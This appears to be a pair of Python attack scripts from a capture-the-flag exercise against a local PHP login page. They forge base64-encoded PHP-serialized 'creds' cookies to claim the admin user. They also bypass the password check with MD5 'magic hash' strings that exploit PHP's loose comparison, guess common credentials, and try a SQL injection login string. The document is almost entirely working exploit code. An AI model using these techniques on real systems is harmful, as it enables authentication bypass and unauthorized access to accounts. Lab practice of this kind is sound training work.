import requests
import base64
import urllib.parse
import re

base_url = "http://127.0.0.1:33063/index.php"

# First, let's decode the creds cookies to understand the structure
cookie_samples = {
    "bad_creds": "YToyOntzOjg6InVzZXJuYW1lIjtzOjIwOiJub25leGlzdGVudF9iYWRfdXNlciI7czo4OiJwYXNzd29yZCI7czoxMzoid3JvbmdwYXNzX3h5eiI7fQ==",
    "homer_QNKCDZO": "YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImhvbWVyIjtzOjg6InBhc3N3b3JkIjtzOjc6IlFOS0NEWk8iO30=",
    "homer_donut": "YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImhvbWVyIjtzOjg6InBhc3N3b3JkIjtzOjU6ImRvbnV0Ijt9",
}

print("[*] Decoding creds cookie values:")
for label, cookie_val in cookie_samples.items():
    decoded = base64.b64decode(cookie_val)
    print(f"  [{label}] {decoded}")

# Now manually carry the cookie to GET request
print("\n[*] Manually passing creds cookie to GET requests")
print("=" * 80)

# Test each payload: POST → extract Set-Cookie → GET with that cookie
test_payloads = [
    ("Bad credentials", {"username": "nonexistent", "password": "wrongpass"}),
    ("homer/QNKCDZO (magic hash)", {"username": "homer", "password": "QNKCDZO"}),
    ("homer/240610708 (magic hash)", {"username": "homer", "password": "240610708"}),
    ("homer/aabg7XSs (magic hash)", {"username": "homer", "password": "aabg7XSs"}),
    ("homer/s878926199a (magic hash)", {"username": "homer", "password": "s878926199a"}),
    ("homer/donut", {"username": "homer", "password": "donut"}),
    ("homer/springfield", {"username": "homer", "password": "springfield"}),
    ("homer/simpson", {"username": "homer", "password": "simpson"}),
    ("admin/admin", {"username": "admin", "password": "admin"}),
    ("SQLi OR 1=1", {"username": "' OR '1'='1'--", "password": "anything"}),
]

for label, payload in test_payloads:
    # POST to get the creds cookie
    resp = requests.post(base_url, data=payload, allow_redirects=False)
    
    # Extract the creds cookie from Set-Cookie header
    set_cookie_header = resp.headers.get('Set-Cookie', '')
    creds_match = re.search(r'creds=([^;]+)', set_cookie_header)
    
    if not creds_match:
        print(f"\n[{label}] No creds cookie set!")
        continue
    
    creds_value = urllib.parse.unquote(creds_match.group(1))
    
    # Decode to see what's stored
    try:
        decoded = base64.b64decode(creds_value)
        print(f"\n[{label}] Cookie decoded: {decoded}")
    except:
        print(f"\n[{label}] Cookie (raw): {creds_value}")
    
    # Now make GET request with this cookie
    get_resp = requests.get(base_url, cookies={"creds": creds_value})
    
    print(f"  GET Status: {get_resp.status_code} | Length: {len(get_resp.text)}B")
    
    # Check for flags
    flags = re.findall(r'FLAG\{[^}]+\}', get_resp.text, re.I)
    if flags:
        print(f"  [!!!] FLAG FOUND: {flags}")
    
    # Check for success indicators
    for keyword in ["flag", "success", "welcome back", "logged in", "authenticated", "secret", "congratulation"]:
        if keyword in get_resp.text.lower():
            print(f"  [+] Contains keyword: {keyword}")
    
    # If response is different from the login form (3106B)
    if len(get_resp.text) != 3106:
        print(f"  [DIFFERENT] Full response:")
        print(get_resp.text)

import requests
import base64
import urllib.parse
import re

base_url = "http://127.0.0.1:33063/index.php"

# The app sets a "creds" cookie with base64-encoded PHP serialized data
# Format: a:2:{s:8:"username";s:N:"value";s:8:"password";s:N:"value";}
# The server reads this cookie and checks if username is admin
# Then it likely hashes the password and compares with stored hash using == (loose comparison)
# PHP type juggling: if stored hash starts with "0e" and all digits, it's treated as 0 in scientific notation
# If our password also hashes to "0e..." with all digits, 0 == 0 is true

# Known strings that MD5 to "0e..." format (PHP magic hashes):
magic_hash_passwords = [
    "QNKCDZO",        # md5 = 0e830400451993494058024219903391
    "240610708",      # md5 = 0e462097431906509019562988736854
    "aabg7XSs",       # md5 = 0e087386482136013740957780965295
    "s878926199a",    # md5 = 0e530993283642760988405668248024
    "s155964671a",    # md5 = 0e...
    "s214587387a",    # md5 = 0e...
    "s1091221200a",   # md5 = 0e...
    "aabC9RqS",       # md5 = 0e...
    "s1887837025a",   # md5 = 0e...
]

print("[*] Testing admin login with magic hash passwords via cookie manipulation")
print("=" * 80)

for password in magic_hash_passwords:
    # Craft the PHP serialized data directly
    php_serialized = f'a:2:{{s:8:"username";s:5:"admin";s:8:"password";s:{len(password)}:"{password}";}}'
    cookie_value = base64.b64encode(php_serialized.encode()).decode()
    
    # GET with the crafted cookie
    resp = requests.get(base_url, cookies={"creds": cookie_value})
    
    # Check for flag or success
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.I)
    is_admin = "you are not the admin" not in resp.text.lower()
    
    print(f"\n[password={password}] Cookie: {cookie_value[:60]}...")
    print(f"  Status: {resp.status_code} | Length: {len(resp.text)}B | Is admin: {is_admin}")
    
    if flags:
        print(f"  [!!!] FLAG FOUND: {flags}")
    
    if is_admin:
        print(f"  [SUCCESS] ADMIN ACCESS!")
        print(f"  Full response:")
        print(resp.text)
    else:
        # Extract just the user message part
        user_match = re.search(r'<center>(.*?)</center>', resp.text, re.S)
        if user_match:
            print(f"  Message: {user_match.group(1).strip()}")

# Also try crafting cookies with different approaches
print("\n\n[*] Alternative: POST with admin + magic hash, then carry cookie")
print("-" * 80)

for password in magic_hash_passwords:
    resp = requests.post(base_url, data={"username": "admin", "password": password}, allow_redirects=False)
    set_cookie = resp.headers.get('Set-Cookie', '')
    creds_match = re.search(r'creds=([^;]+)', set_cookie)
    
    if creds_match:
        creds_value = urllib.parse.unquote(creds_match.group(1))
        get_resp = requests.get(base_url, cookies={"creds": creds_value})
        
        flags = re.findall(r'FLAG\{[^}]+\}', get_resp.text, re.I)
        is_admin = "you are not the admin" not in get_resp.text.lower()
        
        print(f"\n[POST admin/{password}]")
        print(f"  GET Status: {get_resp.status_code} | Length: {len(get_resp.text)}B | Is admin: {is_admin}")
        
        if flags:
            print(f"  [!!!] FLAG FOUND: {flags}")
        
        if is_admin:
            print(f"  [SUCCESS] ADMIN ACCESS!")
            print(f"  Full response:")
            print(get_resp.text)

# Also try: what if we can manipulate the serialized data directly?
# For example, change the username to "admin" in the cookie regardless of what was submitted
print("\n\n[*] Cookie manipulation: Change username to admin in serialized data")
print("-" * 80)

# Try with various passwords including type juggling values
extra_passwords = [
    "0e99999999",  # Direct 0e value that might match
    "0e123456789",
    "0e1",
    "0e0",
    "true",
    "1",
    "0",
    "admin",
    "password",
    "secret",
]

for password in extra_passwords:
    php_serialized = f'a:2:{{s:8:"username";s:5:"admin";s:8:"password";s:{len(password)}:"{password}";}}'
    cookie_value = base64.b64encode(php_serialized.encode()).decode()
    
    resp = requests.get(base_url, cookies={"creds": cookie_value})
    
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.I)
    is_admin = "you are not the admin" not in resp.text.lower()
    
    if is_admin or flags:
        print(f"\n[password={password}] Is admin: {is_admin}")
        print(f"  Full response:")
        print(resp.text)
    else:
        user_match = re.search(r'<center>(.*?)</center>', resp.text, re.S)
        if user_match:
            msg = user_match.group(1).strip()
            print(f"[password={password}] Message: {msg}")

